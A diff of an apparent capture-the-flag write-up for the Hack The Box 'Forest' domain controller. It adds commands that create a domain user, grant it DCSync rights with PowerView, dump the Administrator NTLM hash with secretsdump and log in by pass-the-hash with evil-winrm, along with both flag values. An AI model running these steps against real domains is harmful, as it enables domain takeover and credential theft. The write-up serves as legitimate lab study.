@@ -346,49 +346,8 @@ smb: \> ls
 
 		5069055 blocks of size 4096. 2533698 blocks available
 ```
+But we don't find anything interesting.
 
-After searching very hard, we find an interesting .inf file from the machine GUID {6AC1786C-016F-11D2-945F-00C04fB984F9}:
-```
-cat GptTmpl.inf 
-��[Unicode]
-Unicode=yes
-[Registry Values]
-MACHINE\System\CurrentControlSet\Services\NTDS\Parameters\LDAPServerIntegrity=4,1
-MACHINE\System\CurrentControlSet\Services\Netlogon\Parameters\RequireSignOrSeal=4,1
-MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\RequireSecuritySignature=4,1
-MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\EnableSecuritySignature=4,1
-[Version]
-signature="$CHICAGO$"
-Revision=1
-[Privilege Rights]
-SeAssignPrimaryTokenPrivilege = *S-1-5-19,*S-1-5-20
-SeAuditPrivilege = *S-1-5-19,*S-1-5-20
-SeBackupPrivilege = *S-1-5-32-544,*S-1-5-32-551,*S-1-5-32-549
-SeBatchLogonRight = *S-1-5-32-544,*S-1-5-32-551,*S-1-5-32-559
-SeChangeNotifyPrivilege = *S-1-1-0,*S-1-5-19,*S-1-5-20,*S-1-5-32-544,*S-1-5-11,*S-1-5-32-554
-SeCreatePagefilePrivilege = *S-1-5-32-544
-SeDebugPrivilege = *S-1-5-32-544
-SeIncreaseBasePriorityPrivilege = *S-1-5-32-544
-SeIncreaseQuotaPrivilege = *S-1-5-19,*S-1-5-20,*S-1-5-32-544
-SeInteractiveLogonRight = *S-1-5-32-544,*S-1-5-32-551,*S-1-5-32-548,*S-1-5-32-549,*S-1-5-32-550,*S-1-5-9
-SeLoadDriverPrivilege = *S-1-5-32-544,*S-1-5-32-550
-SeMachineAccountPrivilege = *S-1-5-11
-SeNetworkLogonRight = *S-1-1-0,*S-1-5-32-544,*S-1-5-11,*S-1-5-9,*S-1-5-32-554
-SeProfileSingleProcessPrivilege = *S-1-5-32-544
-SeRemoteShutdownPrivilege = *S-1-5-32-544,*S-1-5-32-549
-SeRestorePrivilege = *S-1-5-32-544,*S-1-5-32-551,*S-1-5-32-549
-SeSecurityPrivilege = *S-1-5-21-3072663084-364016917-1341370565-1118,*S-1-5-32-544
-SeShutdownPrivilege = *S-1-5-32-544,*S-1-5-32-551,*S-1-5-32-549,*S-1-5-32-550
-SeSystemEnvironmentPrivilege = *S-1-5-32-544
-SeSystemProfilePrivilege = *S-1-5-32-544,*S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420
-SeSystemTimePrivilege = *S-1-5-19,*S-1-5-32-544,*S-1-5-32-549
-SeTakeOwnershipPrivilege = *S-1-5-32-544
-SeUndockPrivilege = *S-1-5-32-544
-SeEnableDelegationPrivilege = *S-1-5-32-544
-```
-This is the sheet of which AD groups are assigned to which privileges. We can abuse this later for privilege escalation. 
-
-### User.txt file found
 We can now move on from SMB, and recall that from our nmap scan that the winRM port 5985 is open, meaning we can use Evil-WinRM to remote into the domain controller with the svc-alfresco and s3rvice credentials. 
 
 ```
@@ -411,6 +370,7 @@ Mode                LastWriteTime         Length Name
 *Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> cat user.txt
 c095053e015dee428a9697e25dde73da
 ```
+### user.txt file found
 
 We see the user folders sebastien and Administrator but we do not have the permission to cd to them. Since we already have a domain user account, what we need is to escalate to SYSTEM. We can try using WinPEAS which will automatically scan for privilege escalation paths in a Windows machine. 
 
@@ -437,5 +397,44 @@ We next try using SharpHound to enumerate the entire domain. We upload SharpHoun
 SharpHound.exe -c All 
 ```
 
-We then run Bloodhound and upload the data from the zip file. We search for svc-alfresco 
+We then run Bloodhound and upload the data from the zip file. We search for a path from svc-alfresco to administrator@htb.local. I tried adjusting path but did not see anything exploitable, so I run SharpHound.exe again but this time with the -c DCOnly method so that we can decrease the amount of clutter in BloodHound that may be affecting the paths.
 
+```
+SharpHound.exe -c DCOnly
+```
+
+This time we get a valid path to Administrator by using the GenericAll permission of svc-alfresco in the Account Operators group to add users to the Exchange Windows Permissions group.
+
+We know that svc-alfresco has GenericAll to Account Operators which grants us account creation privileges. We can use this to create a new account and add it to the EXCHANGE WINDOWS PERMISSIONS group that we have genericall permissions to. 
+```
+net user test1 test123 /add /domain
+net group "EXCHANGE WINDOWS PERMISSIONS" /add test1
+```
+We then import PowerView.ps1 with Evil-WinRM so that we can create a PSCredential object to authenticate to the DC. 
+```
+download PowerView.ps1
+Import-Module /path/PowerView.ps1
+$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('domain\username', $SecPassword)
+Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity test1 -Rights DCSync
+```
+Then we can use secretsdump on our box to dump hashes after the command successfully runs:
+```
+./secretsdump.py htb.local/test1:test123@10.10.10.161
+```
+We get the administrator hash:
+```
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+```
+We take the NTLM hash on the right and use it to authenticate as a pass the hash attack with Evil-WINRM or any other remote tool you'd like:
+```
+sudo evil-winrm -i 10.10.10.161 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
+```
+Then we simply cd to the desktop and get the final root flag:
+```
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
+c768b23a159c977fb5f02c7fb13cc7b6
+```
+### root.txt file found
+
+That is it, we have successfully found both user.txt and root.txt files that the box is asking for by escalating to Domain/Enterprise admin on the domain controller, primarily by abusing the open Kerberos service and kerberos-preauthentication disabled. 
